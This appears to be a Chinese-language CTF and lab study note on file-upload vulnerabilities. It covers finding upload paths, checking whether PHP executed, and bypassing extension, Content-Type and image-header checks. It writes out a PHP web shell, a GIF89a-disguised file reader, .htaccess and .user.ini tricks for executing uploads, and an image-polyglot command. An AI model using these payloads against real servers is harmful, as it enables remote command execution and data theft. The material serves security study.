+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十一、我踩的坑（实践版）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十一、我踩的坑（实践版）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1invalid-image-file-name" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 1：把"Invalid image file name"理解成"内容不是图片"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-php5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 2：以为 .php5 上传成功就能执行
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-304" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 6：把 304 当成错误
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 7：把"图像无法显示"当成"没执行"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 8：不知道用响应头判断"执行了没"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#10system-php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 10：system() 里写 PHP 函数
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#11-shellphpjpg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 11：以为 shell.php.jpg 能绕白名单
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 14：改后缀一直提示"不是合法图片"
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exiftool" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十二、工具：exiftool 速查
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十二、工具：exiftool 速查">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#121" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.1 它是什么
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#123" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.3 三个核心参数
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#124" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.4 上传题最常用的四条命令
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#125-jpeg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.5 常用的标签（JPEG）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#127-polyglot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.7 polyglot 自检两条
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十三、拿到 shell 之后：常用命令速查
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十三、拿到 shell 之后：常用命令速查">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#131" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.1 四步法（照着做就行）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#132-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.2 最常用的 10 条命令
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#133-ls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.3 ls 详解
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#134-cat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.4 读文件：cat 家族
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#135-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.5 搜索：找不到 flag 就用这个
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#136" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.6 看环境：判断这台机器什么情况
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#137-ctf-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.7 CTF 里 flag 常放的位置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#139" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.9 一句话总结
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十四、一句话总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="_1">文件上传专题<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>上传题的三个变量:<strong>路径、后缀、内容</strong>。
+三个里任何一个没搞对,都表现为"上传成功但拿不到 shell"。</p>
+</blockquote>
+<hr />
+<h2 id="_2">一、先建立正确的心理模型<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>你上传文件
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    ↓
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>服务器做三件事(每件都可能被拦)
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>    ① 校验:后缀?Content-Type?文件内容?
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>    ② 保存:存到哪个目录?用什么名字?
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>    ③ 访问:通过哪个 URL 能拿到?
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>    ↓
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>你访问那个 URL
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    ↓
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>能不能执行,取决于:那个目录有没有开 PHP 处理器
+</span></code></pre></div>
+<p><strong>绝大多数人卡在"③ 访问"这一步 —— 不知道文件在哪。</strong></p>
+<hr />
+<h2 id="_3">二、上传后怎么找真实路径<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="1">方法 1:上传响应里找<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<p><strong>响应可能是：</strong></p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>The file avatars/aa.php has been uploaded.
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"/files/avatars/aa.php"</span><span class="p">&gt;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"/uploads/aa.php"</span><span class="p">&gt;</span>下载<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p><strong>如果只有第一种（"avatars/aa.php"），那是</strong>相对路径<strong>，前面还得补一段。</strong></p>
+<h3 id="2">方法 2:看"显示这个文件"的页面源码 ⭐ 最可靠<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>浏览器打开 个人中心 / 资料页
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>→ Ctrl+U 查看源代码
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>→ Ctrl+F 搜 avatars / uploads / 你的文件名
+</span></code></pre></div>
+<p><strong>应用自己怎么引用，你就怎么访问。</strong></p>
+<h3 id="4">方法 4:按常见路径试<a class="headerlink" href="#4" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>/files/avatars/&lt;名&gt;
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>/uploads/&lt;名&gt;
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>/upload/&lt;名&gt;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>/avatars/&lt;名&gt;
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>/images/&lt;名&gt;
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>/files/&lt;名&gt;
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>/static/uploads/&lt;名&gt;
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>/attachment/&lt;名&gt;
+</span></code></pre></div>
+<p><strong>响应码的含义：</strong></p>
+<table>
+<thead>
+<tr>
+<th>码</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>200</strong></td>
+<td>找到了</td>
+</tr>
+<tr>
+<td>404</td>
+<td>这个路径没有</td>
+</tr>
+<tr>
+<td><strong>403</strong></td>
+<td>路径对，但被禁止访问</td>
+</tr>
+<tr>
+<td><strong>500</strong></td>
+<td>路径对，PHP 执行报错（说明能执行！）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="php">三、判断"PHP 到底执行了没"<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
+<h3 id="1_1">铁证 1:看响应体<a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>响应体内容</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GIF89a</code> + <code>&lt;?php echo ...; ?&gt;</code></td>
+<td><strong>没执行</strong>（源码原样返回）</td>
+</tr>
+<tr>
+<td><code>GIF89a</code> + <code>你要读的内容</code></td>
+<td><strong>执行了</strong> ✅</td>
+</tr>
+</tbody>
+</table>
+<p><strong>代码被"替换"成输出 = 执行；代码原样出现 = 没执行。</strong></p>
+<h3 id="2-5">铁证 2:看响应头 ⭐ 5 秒判断<a class="headerlink" href="#2-5" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Last-Modified: Tue, 20 Oct 2026 08:05:12 GMT
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Etag: "3f-65e411701a1d4"
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Accept-Ranges: bytes
+</span></code></pre></div>
+<p><strong>这三个头 = Apache 在发静态文件。</strong></p>
+<p><strong>PHP 动态生成的内容不会带 <code>Last-Modified</code> 和 <code>Accept-Ranges</code>。</strong></p>
+<h3 id="3-content-length">铁证 3:看 Content-Length<a class="headerlink" href="#3-content-length" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Content-Length: 63
+</span></code></pre></div>
+<p><strong>如果它正好等于你上传文件的字节数 → 原样吐出，没执行。</strong></p>
+<p><strong>执行过的话，长度会等于"输出结果"的长度。</strong></p>
+<h3 id="4content-type">铁证 4:Content-Type<a class="headerlink" href="#4content-type" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>头</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Content-Type: image/jpeg</code></td>
+<td>按图片分发（来自 multipart 里声明的类型）</td>
+</tr>
+<tr>
+<td><code>Content-Type: text/html</code></td>
+<td>按 HTML 分发，可能执行了</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_4">四、三个变量的绕过<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h3 id="1_2">变量 1:后缀被拦<a class="headerlink" href="#1_2" title="Permanent link">&para;</a></h3>
+<p><strong>黑名单绕过（按成功率排序）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>手法</th>
+<th>写法</th>
+<th>前提</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>大小写</strong></td>
+<td><code>shell.PHP</code>、<code>shell.PhP</code></td>
+<td>黑名单区分大小写</td>
+</tr>
+<tr>
+<td><strong>其他可执行后缀</strong></td>
+<td><code>shell.phtml</code>、<code>.php5</code>、<code>.php4</code>、<code>.pht</code>、<code>.phar</code></td>
+<td>Apache 配置了这些后缀</td>
+</tr>
+<tr>
+<td><strong>双扩展名</strong></td>
+<td><code>shell.php.jpg</code></td>
+<td>服务器按最后一个后缀判、但 Apache 按第一个执行</td>
+</tr>
+<tr>
+<td><strong>末尾点/空格</strong></td>
+<td><code>shell.php.</code>、<code>shell.php</code></td>
+<td>Windows</td>
+</tr>
+<tr>
+<td><strong>空字节截断</strong></td>
+<td><code>shell.php%00.jpg</code></td>
+<td>PHP &lt; 5.3.4</td>
+</tr>
+<tr>
+<td><strong>上传 .htaccess</strong></td>
+<td>内容 <code>AddType application/x-httpd-php .jpg</code></td>
+<td>允许上传 .htaccess</td>
+</tr>
+<tr>
+<td><strong>分号</strong></td>
+<td><code>shell.php;.jpg</code></td>
+<td>某些解析器</td>
+</tr>
+</tbody>
+</table>
+<p><strong>判断黑名单还是白名单：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>传 .php   → 被拒  → 有校验
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>传 .phtml → 通过  → 黑名单(只封了 .php)
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>传 .phtml → 被拒  → 白名单(只允许图片后缀)
+</span></code></pre></div>
+<h3 id="_5">黑名单绕过速查表（按「生效条件」排）<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>手法</th>
+<th>示例</th>
+<th>生效条件</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>大小写</strong></td>
+<td><code>1.PhP</code></td>
+<td>黑名单没做统一小写</td>
+<td>最便宜的一招</td>
+</tr>
+<tr>
+<td><strong>后加空格 / 点</strong></td>
+<td><code>1.php</code> / <code>1.php.</code></td>
+<td><strong>Windows 落盘时自动去掉</strong></td>
+<td>Linux 下无效</td>
+</tr>
+<tr>
+<td><strong><code>::$DATA</code></strong></td>
+<td><code>1.php::$DATA</code></td>
+<td><strong>Windows + PHP</strong>（NTFS 备用数据流）</td>
+<td>落盘后就是 <code>1.php</code></td>
+</tr>
+<tr>
+<td><strong>特殊后缀</strong></td>
+<td><code>.php5</code> <code>.phtml</code> <code>.pht</code> <code>.phar</code></td>
+<td>Apache 配置把该后缀映射给 PHP</td>
+<td><strong>没映射就只能当静态文件</strong></td>
+</tr>
+<tr>
+<td><strong><code>.htaccess</code></strong></td>
+<td>内容 <code>AddType application/x-httpd-php .jpg</code></td>
+<td>Apache 且放行上传 <code>.htaccess</code></td>
+<td>改规则，不改后缀</td>
+</tr>
+<tr>
+<td><strong><code>.user.ini</code></strong></td>
+<td>内容 <code>auto_prepend_file=shell.jpg</code></td>
+<td><strong>FastCGI / PHP-FPM</strong></td>
+<td>见下一节</td>
+</tr>
+<tr>
+<td><strong>双扩展名</strong></td>
+<td><code>1.php.jpg</code></td>
+<td>校验看末尾、执行看开头（很少见）</td>
+<td>白名单题里是死路</td>
+</tr>
+<tr>
+<td><strong>空字节截断</strong></td>
+<td><code>1.php%00.jpg</code></td>
+<td>PHP &lt; 5.3.4</td>
+<td>现代环境基本失效</td>
+</tr>
+<tr>
+<td><strong>分号</strong></td>
+<td><code>1.php;.jpg</code></td>
+<td>某些 CGI 解析器</td>
+<td>少见</td>
+</tr>
+</tbody>
+</table>
+<p><strong>三个 Windows 专属的（Linux 上没用）：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>1.php␣     末尾空格,Windows 保存时自动去掉
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>1.php.     末尾点,同上
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>1.php::$DATA   NTFS 数据流,相当于 1.php
+</span></code></pre></div>
+<p><strong>一个 Apache 专属的（Nginx 上没用）：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>.htaccess
+</span></code></pre></div>
+<p><strong>一个 FastCGI 专属的（mod_php 上没用）：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>.user.ini
+</span></code></pre></div>
+<p><strong>关键认知：</strong></p>
+<blockquote>
+<p><strong>白名单题里 <code>shell.php.jpg</code> 是死路 —— 因为它让校验和执行「一致」了。</strong></p>
+<p><strong>你要的是「不一致」，不是「更长的名字」。</strong></p>
+</blockquote>
+<h3 id="1_3">变量 1 的终极解法：不改我的后缀，改服务器的规则<a class="headerlink" href="#1_3" title="Permanent link">&para;</a></h3>
+<p><strong>黑名单管的是"哪些后缀不许传"；<code>.htaccess</code> 能改"哪些后缀算 PHP"。</strong></p>
+<p><strong>上传一个 <code>.htaccess</code>，内容：</strong></p>
+<div class="language-apache highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">AddType</span><span class="w"> </span>application/x-httpd-php<span class="w"> </span>.lhm
+</span></code></pre></div>
+<p><strong>含义：告诉 Apache，<code>.lhm</code> 结尾的文件交给 PHP 处理器。</strong></p>
+<p><strong>然后传 <code>shell.lhm</code>（内容是 PHP 代码），访问 <code>/files/avatars/shell.lhm</code> → 执行。</strong></p>
+<p><strong>成立的两个前提：</strong></p>
+<table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>黑名单没封 <code>.htaccess</code></strong></td>
+<td>很多题只封 <code>.php</code>，<code>.htaccess</code> 是漏网之鱼</td>
+</tr>
+<tr>
+<td><strong><code>AllowOverride</code> 允许</strong></td>
+<td>Apache 默认 <code>All</code>，实验室通常开着</td>
+</tr>
+</tbody>
+</table>
+<p><strong>同类思路（换服务器 / 换模块，本质一样）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>服务器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.htaccess</code></td>
+<td>Apache</td>
+<td><code>AddType</code> / <code>AddHandler</code> 注册新后缀</td>
+</tr>
+<tr>
+<td><code>.user.ini</code></td>
+<td>PHP-FPM</td>
+<td><code>auto_prepend_file</code> 自动包含你的文件</td>
+</tr>
+<tr>
+<td><code>web.config</code></td>
+<td>IIS</td>
+<td>handler 映射</td>
+</tr>
+</tbody>
+</table>
+<p><strong>核心洞察：与其想办法骗过黑名单，不如直接改写服务器的判定规则。</strong></p>
+<h3 id="1-userini">变量 1 的终极解法（二）：<code>.user.ini</code><a class="headerlink" href="#1-userini" title="Permanent link">&para;</a></h3>
+<p><strong><code>.htaccess</code> 管</strong>Apache<strong>，<code>.user.ini</code> 管</strong>PHP** —— 两个不同层面的配置。**</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th><code>.htaccess</code></th>
+<th><code>.user.ini</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>归属</strong></td>
+<td>Apache</td>
+<td>PHP</td>
+</tr>
+<tr>
+<td><strong>读取者</strong></td>
+<td>Apache 进程</td>
+<td><strong>PHP-FPM / CGI</strong></td>
+</tr>
+<tr>
+<td><strong>能改什么</strong></td>
+<td>URL 重写、MIME、handler、访问控制</td>
+<td>只有 PHP 的 ini 指令（<code>auto_prepend_file</code> 等）</td>
+</tr>
+<tr>
+<td><strong>生效时机</strong></td>
+<td><strong>立即</strong></td>
+<td><strong>有缓存，默认 300 秒</strong></td>
+</tr>
+<tr>
+<td><strong>前提</strong></td>
+<td><code>AllowOverride</code> 开着</td>
+<td><code>user_ini.filename</code> 非空（默认 <code>.user.ini</code>）</td>
+</tr>
+</tbody>
+</table>
+<h4 id="_6">服务器类型决定用哪个 ⭐<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>环境</th>
+<th><code>.htaccess</code></th>
+<th><code>.user.ini</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Apache + mod_php</strong></td>
+<td>✅</td>
+<td>❌ <strong>不生效</strong></td>
+</tr>
+<tr>
+<td><strong>Apache + PHP-FPM</strong></td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><strong>Nginx + PHP-FPM</strong></td>
+<td>❌ <strong>Nginx 不读它</strong></td>
+<td>✅</td>
+</tr>
+<tr>
+<td>IIS + FastCGI</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+</tbody>
+</table>
+<p><strong>判断方法：看响应头。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Server: Apache/2.4.41   → Apache
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Server: nginx/1.18.0    → Nginx，只能用 .user.ini
+</span></code></pre></div>
+<h4 id="userini"><code>.user.ini</code> 完整利用流程<a class="headerlink" href="#userini" title="Permanent link">&para;</a></h4>
+<p><strong>第 1 步：传一个"图片 + PHP"</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>文件名:shell.jpg
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>内容:  &lt;?php system($_GET['c']); ?&gt;
+</span></code></pre></div>
+<p><strong>第 2 步：传 <code>.user.ini</code></strong></p>
+<div class="language-ini highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="na">auto_prepend_file</span><span class="o">=</span><span class="s">shell.jpg</span>
+</span></code></pre></div>
+<p><strong>推荐写绝对路径（更稳）：</strong></p>
+<div class="language-ini highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="na">auto_prepend_file</span><span class="o">=</span><span class="s">/var/www/html/upload/shell.jpg</span>
+</span></code></pre></div>
+<p><strong>第 3 步：访问同目录下任意一个 <code>.php</code> 文件</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>/upload/index.php?c=cat /flag
+</span></code></pre></div>
+<p><strong>执行顺序：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>① 请求 /upload/index.php
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>② PHP 读到 .user.ini → auto_prepend_file=shell.jpg
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>③ 先 include shell.jpg
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>④ shell.jpg 里的 system($_GET['c']) 执行
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>⑤ 再执行 index.php 本身的代码
+</span></code></pre></div>
+<h4 id="_7">五个坑<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>坑</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>① 300 秒缓存</strong></td>
+<td><code>user_ini.cache_ttl</code> 默认 300 秒，传完立刻访问可能没反应</td>
+</tr>
+<tr>
+<td><strong>② 必须有 PHP 文件被访问</strong></td>
+<td>目录里没有 <code>.php</code> 被请求，<code>.user.ini</code> 永远不触发</td>
+</tr>
+<tr>
+<td><strong>③ 路径要写对</strong></td>
+<td>优先绝对路径，相对路径按 <code>include_path</code> 解析容易失败</td>
+</tr>
+<tr>
+<td><strong>④ 文件名可能被拉黑</strong></td>
+<td>有些题直接封 <code>.user.ini</code> 和 <code>.htaccess</code></td>
+</tr>
+<tr>
+<td><strong>⑤ 语法是 php.ini 风格</strong></td>
+<td><code>key=value</code>，不是 Apache 指令，等号两边别加空格</td>
+</tr>
+</tbody>
+</table>
+<h4 id="userini_1">为什么 <code>.user.ini</code> 更强<a class="headerlink" href="#userini_1" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p><strong>它不需要"可执行的后缀" —— 你的 shell 可以叫 <code>.jpg</code>，照样被执行。</strong></p>
+</blockquote>
+<p><strong><code>.htaccess</code> 的做法是"注册一个新后缀"，你仍然需要一个能被映射的后缀；</strong>
+<strong><code>.user.ini</code> 绕过了这整个问题 —— 改成"执行前自动包含"，后缀无关。</strong></p>
+<h3 id="2content-type">变量 2:Content-Type 被查<a class="headerlink" href="#2content-type" title="Permanent link">&para;</a></h3>
+<p><strong>改 multipart 里那一行：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Content-Disposition: form-data; name="avatar"; filename="shell.php"
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Content-Type: image/jpeg        ← 声明成图片类型
+</span></code></pre></div>
+<p><strong>服务器只看这个头，不看内容 → 通过。</strong></p>
+<h3 id="3">变量 3:文件内容被查（图片头校验）<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
+<p><strong>如果服务器用 <code>getimagesize()</code> / <code>exif_imagetype()</code> 检查，就要伪装文件头：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="x">GIF89a</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/home/carlos/secret'</span><span class="p">);</span> <span class="cp">?&gt;</span>
+</span></code></pre></div>
+<p><strong><code>GIF89a</code> 是 GIF 的魔数，<code>getimagesize</code> 只看开头几个字节就能通过。</strong></p>
+<p><strong>更高级的"图片马"：</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># 在真实图片后面追加 PHP 代码</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>copy<span class="w"> </span>real.gif<span class="w"> </span>/b<span class="w"> </span>+<span class="w"> </span>shell.php<span class="w"> </span>/a<span class="w"> </span>webshell.gif
+</span></code></pre></div>
+<p><strong>真实图片头 + 完整图片结构 + 尾部 PHP → 既能通过校验，又能被 Apache 当 PHP 执行（如果后缀绕过成功）。</strong></p>
+<hr />
